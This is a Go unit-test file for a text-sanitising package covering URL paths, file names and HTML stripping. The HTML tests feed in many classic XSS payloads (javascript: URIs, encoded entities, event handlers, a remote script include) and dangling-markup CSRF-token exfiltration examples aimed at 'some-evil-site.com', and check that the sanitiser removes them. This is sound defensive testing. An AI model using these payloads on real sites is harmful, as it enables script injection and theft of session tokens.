// Utility functions for working with text
package sanitize

import (
	"testing"
)

var Format = "\ninput:    %q\nexpected: %q\noutput:   %q"

type Test struct {
	input    string
	expected string
}

// NB the treatment of accents - they are removed and replaced with ascii transliterations
var urls = []Test{
	{"ReAd ME.md", `read-me.md`},
	{"E88E08A7-279C-4CC1-8B90-86DE0D7044_3C.html", `e88e08a7-279c-4cc1-8b90-86de0d7044-3c.html`},
	{"/user/test/I am a long url's_-?ASDF@£$%£%^testé.html", `/user/test/i-am-a-long-urls-asdfteste.html`},
	{"/../../4-icon.jpg", `/4-icon.jpg`},
	{"/Images_dir/../4-icon.jpg", `/images-dir/4-icon.jpg`},
	{"../4 icon.*", `/4-icon.`},
	{"Spac ey/Nôm/test før url", `spac-ey/nom/test-foer-url`},
	{"../*", `/`},
}

func TestPath(t *testing.T) {
	for _, test := range urls {
		output := Path(test.input)
		if output != test.expected {
			t.Fatalf(Format, test.input, test.expected, output)
		}
	}
}

func BenchmarkPath(b *testing.B) {
	for i := 0; i < b.N; i++ {
		for _, test := range urls {
			output := Path(test.input)
			if output != test.expected {
				b.Fatalf(Format, test.input, test.expected, output)
			}
		}
	}
}

var fileNames = []Test{
	{"ReAd ME.md", `read-me.md`},
	{"/var/etc/jobs/go/go/src/pkg/foo/bar.go", `bar.go`},
	{"I am a long url's_-?ASDF@£$%£%^é.html", `i-am-a-long-urls-asdfe.html`},
	{"/../../4-icon.jpg", `4-icon.jpg`},
	{"/Images/../4-icon.jpg", `4-icon.jpg`},
	{"../4 icon.jpg", `4-icon.jpg`},
	{"../4 icon-testé *8%^\"'\".jpg ", `4-icon-teste-8.jpg`},
}

func TestName(t *testing.T) {
	for _, test := range fileNames {
		output := Name(test.input)
		if output != test.expected {
			t.Fatalf(Format, test.input, test.expected, output)
		}
	}
}

func BenchmarkName(b *testing.B) {
	for i := 0; i < b.N; i++ {
		for _, test := range fileNames {
			output := Name(test.input)
			if output != test.expected {
				b.Fatalf(Format, test.input, test.expected, output)
			}
		}
	}
}

var baseFileNames = []Test{
	{"The power & the Glory jpg file. The end", `The-power-the-Glory-jpg-file-The-end`},
	{"/../../4-iCoN.jpg", `-4-iCoN-jpg`},
	{"And/Or", `And-Or`},
	{"Sonic.EXE", `Sonic-EXE`},
	{"012: #Fetch for Defaults", `012-Fetch-for-Defaults`},
}

func TestBaseName(t *testing.T) {
	for _, test := range baseFileNames {
		output := BaseName(test.input)
		if output != test.expected {
			t.Fatalf(Format, test.input, test.expected, output)
		}
	}
}

// Test with some malformed or malicious html
// NB because we remove all tokens after a < until the next >
// and do not attempt to parse, we should be safe from invalid html,
// but will sometimes completely empty the string if we have invalid input
// Note we sometimes use " in order to keep things on one line and use the ` character
var htmlTests = []Test{
	{`&nbsp;`, " "},
	{`&amp;#x000D;`, `&amp;#x000D;`},
	{`<invalid attr="invalid"<,<p><p><p><p><p>`, ``},
	{"<b><p>Bold </b> Not bold</p>\nAlso not bold.", "Bold  Not bold\nAlso not bold."},
	{`FOO&#x000D;ZOO`, "FOO\rZOO"},
	{`<script><!--<script </s`, ``},
	{`<a href="/" alt="Fab.com | Aqua Paper Map 22"" title="Fab.com | Aqua Paper Map 22" - fab.com">test</a>`, `test`},
	{`<p</p>?> or <p id=0</p> or <<</>><ASDF><@$!@£M<<>>>>>>>>>>>>>><>***************aaaaaaaaaaaaaaaaaaaaaaaaaa>`, ` or ***************aaaaaaaaaaaaaaaaaaaaaaaaaa`},
	{`<p>Some text</p><frameset src="testing.html"></frameset>`, "Some text\n"},
	{`Something<br/>Some more`, "Something\nSome more"},
	{`<a href="http://www.example.com"?>This is a 'test' of <b>bold</b> &amp; <i>italic</i></a> <br/> invalid markup.<//data>><alert><script CDATA[:Asdfjk2354115nkjafdgs]>. <div src=">">><><img src="">`, "This is a 'test' of bold & italic \n invalid markup.. \""},
	{`<![CDATA[<sender>John Smith</sender>]]>`, `John Smith]]`},
	{`<!-- <script src='blah.js' data-rel='fsd'> --> This is text`, ` -- This is text`},
	{`<style>body{background-image:url(http://www.google.com/intl/en/images/logo.gif);}</style>`, `body{background-image:url(http://www.google.com/intl/en/images/logo.gif);}`},
	{`&lt;iframe src="" attr=""&gt;>>>>>`, `&lt;iframe src="" attr=""&gt;`},
	{`<IMG """><SCRIPT>alert("XSS")</SCRIPT>">`, `alert("XSS")"`},
	{`<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>`, ``},
	{`<IMG SRC=JaVaScRiPt:alert('XSS')&gt;`, ``},
	{`<IMG SRC="javascript:alert('XSS')" <test`, ``},
	{`<a href="javascript:alert('XSS')" src="javascript:alert('XSS')" onclick="javascript:alert('XSS')"></a>`, ``},
	{`&gt & test &lt`, `&gt; & test &lt;`},
	{`<img></IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>`, ``},
	{`&#8220;hello&#8221; it&#8217;s for &#8216;real&#8217;`, `"hello" it's for 'real'`},
	{`<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>`, ``},
	{`'';!--"<XSS>=&{()}`, `'';!--"=&amp;{()}`},
	{"LINE 1<br />\nLINE 2", "LINE 1\nLINE 2"},

	// Examples from https://githubengineering.com/githubs-post-csp-journey/
	{`<img src='https://example.com/log_csrf?html=`, ``},
	{`<img src='https://example.com/log_csrf?html=
<form action="https://example.com/account/public_keys/19023812091023">
...
<input type="hidden" name="csrf_token" value="some_csrf_token_value">
</form>`, `...`},
	{`<img src='https://example.com?d=https%3A%2F%2Fsome-evil-site.com%2Fimages%2Favatar.jpg%2f
	<p>secret</p>`, `secret
`},
	{`<form action="https://some-evil-site.com"><button>Click</button><textarea name='
<!-- </textarea> --><!-- '" -->
<form action="/logout">
  <input name="authenticity_token" type="hidden" value="secret1">
</form>`, `Click --  `},
}

func TestHTML(t *testing.T) {
	for _, test := range htmlTests {
		output := HTML(test.input)
		if output != test.expected {
			t.Fatalf(Format, test.input, test.expected, output)
		}
	}
}

var htmlTestsAllowing = []Test{
	{`<IMG SRC="jav&#x0D;ascript:alert('XSS');">`, `<img>`},
	{`<i>hello world</i href="javascript:alert('hello world')">`, `<i>hello world</i>`},
	{`hello<br ><br / ><hr /><hr    >rulers`, `hello<br><br><hr/><hr>rulers`},
	{`<span class="testing" id="testid" name="testname" style="font-color:red;text-size:gigantic;"><p>Span</p></span>`, `<span class="testing" id="testid" name="testname"><p>Span</p></span>`},
	{`<div class="divclass">Div</div><h4><h3>test</h4>invalid</h3><p>test</p>`, `<div class="divclass">Div</div><h4><h3>test</h4>invalid</h3><p>test</p>`},
	{`<p>Some text</p><exotic><iframe>test</iframe><frameset src="testing.html"></frameset>`, `<p>Some text</p>`},
	{`<b>hello world</b>`, `<b>hello world</b>`},
	{`text<p>inside<p onclick='alert()'/>too`, `text<p>inside<p/>too`},
	{`&amp;#x000D;`, `&amp;#x000D;`},
	{`<invalid attr="invalid"<,<p><p><p><p><p>`, `<p><p><p><p>`},
	{"<b><p>Bold </b> Not bold</p>\nAlso not bold.", "<b><p>Bold </b> Not bold</p>\nAlso not bold."},
	{"`FOO&#x000D;ZOO", "`FOO&#13;ZOO"},
	{`<script><!--<script </s`, ``},
	{`<a href="/" alt="Fab.com | Aqua Paper Map 22"" title="Fab.com | Aqua Paper Map 22" - fab.com">test</a>`, `<a href="/" alt="Fab.com | Aqua Paper Map 22" title="Fab.com | Aqua Paper Map 22">test</a>`},
	{"<p</p>?> or <p id=0</p> or <<</>><ASDF><@$!@£M<<>>>>>>>>>>>>>><>***************aaaaaaaaaaaaaaaaaaaaaaaaaa>", "?&gt; or <p id=\"0&lt;/p\"> or &lt;&lt;&gt;&lt;@$!@£M&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&lt;&gt;***************aaaaaaaaaaaaaaaaaaaaaaaaaa&gt;"},
	{`<p>Some text</p><exotic><iframe><frameset src="testing.html"></frameset>`, `<p>Some text</p>`},
	{"Something<br/>Some more", `Something<br/>Some more`},
	{`<a href="http://www.example.com"?>This is a 'test' of <b>bold</b> &amp; <i>italic</i></a> <br/> invalid markup.</data><alert><script CDATA[:Asdfjk2354115nkjafdgs]>. <div src=">escape;inside script tag"><img src="">`, `<a href="http://www.example.com">This is a &#39;test&#39; of <b>bold</b> &amp; <i>italic</i></a> <br/> invalid markup.`},
	{"<sender ignore=me>John Smith</sender>", `John Smith`},
	{"<!-- <script src='blah.js' data-rel='fsd'> --> This is text", ` This is text`},
	{"<style>body{background-image:url(http://www.google.com/intl/en/images/logo.gif);}</style>", ``},
	{`&lt;iframe src="" attr=""&gt;`, `&lt;iframe src=&#34;&#34; attr=&#34;&#34;&gt;`},
	{`<IMG """><SCRIPT>alert("XSS")</SCRIPT>">`, `<img>&#34;&gt;`},
	{`<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>`, `<img>`},
	{`<IMG SRC=JaVaScRiPt:alert('XSS')&gt;`, ``},
	{`<IMG SRC="javascript:alert('XSS')">>> <test`, `<img>&gt;&gt; `},
	{`&gt & test &lt`, `&gt; &amp; test &lt;`},
	{`<img></IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>`, `<img></img>`},
	{`<img src="data:text/javascript;alert('alert');">`, `<img>`},
	{`<iframe src=http://... <`, ``},
	{`<iframe src="data:CSS"><img><a><</a>;sdf<iframe>`, ``},
	{`<img src=javascript:alert(document.cookie)>`, `<img>`},
	{`<?php echo('hello world')>`, ``},
	{`Hello <STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>World`, `Hello <a class="XSS"></a>World`},
	{`<a href="javascript:alert('XSS1')" onmouseover="alert('XSS2')">XSS<a>`, `<a>XSS<a>`},
	{`<a href="http://www.google.com/"><img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png"/></a>`,
		`<a href="http://www.google.com/"><img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png"/></a>`},
	{`<a href="javascript:alert(&#39;XSS1&#39;)" "document.write('<HTML> Tags and markup');">XSS<a>`, `<a> Tags and markup&#39;);&#34;&gt;XSS<a>`},
	{`<a <script>document.write("UNTRUSTED INPUT: " + document.location.hash);<script/> >`, `<a>document.write(&#34;UNTRUSTED INPUT: &#34; + document.location.hash); &gt;`},
	{`<a href="#anchor">foo</a>`, `<a href="#anchor">foo</a>`},
	{`<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>`, `<img>`},
	{`<IMG SRC="jav	ascript:alert('XSS');">`, `<img>`},
	{`<IMG SRC="jav&#x09;ascript:alert('XSS');">`, `<img>`},
	{`<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-`, ` +ADw-SCRIPT+AD4-alert(&#39;XSS&#39;);+ADw-/SCRIPT+AD4-`},
	{`<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>`, `PT SRC=&#34;http://ha.ckers.org/xss.js&#34;&gt;`},
	{`<a href="javascript:alert('XSS')" src="javascript:alert('XSS')" onclick="javascript:alert('XSS')"></a>`, `<a></a>`},
	{`'';!--"<XSS>=&{()}`, `&#39;&#39;;!--&#34;=&amp;{()}`},
	{`<IMG SRC=javascript:alert('XSS')`, ``},
	{`<IMG """><SCRIPT>alert("XSS")</SCRIPT>">`, `<img>&#34;&gt;`},
	{`<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>`, `<img>`},
}

func TestHTMLAllowed(t *testing.T) {

	for _, test := range htmlTestsAllowing {
		output, err := HTMLAllowing(test.input)
		if err != nil {
			t.Fatalf(Format, test.input, test.expected, output, err)
		}
		if output != test.expected {
			t.Fatalf(Format, test.input, test.expected, output)
		}
	}
}

func BenchmarkHTMLAllowed(b *testing.B) {
	for i := 0; i < b.N; i++ {
		for _, test := range htmlTestsAllowing {
			output, err := HTMLAllowing(test.input)
			if err != nil {
				b.Fatalf(Format, test.input, test.expected, output, err)
			}
			if output != test.expected {
				b.Fatalf(Format, test.input, test.expected, output)
			}
		}
	}
}
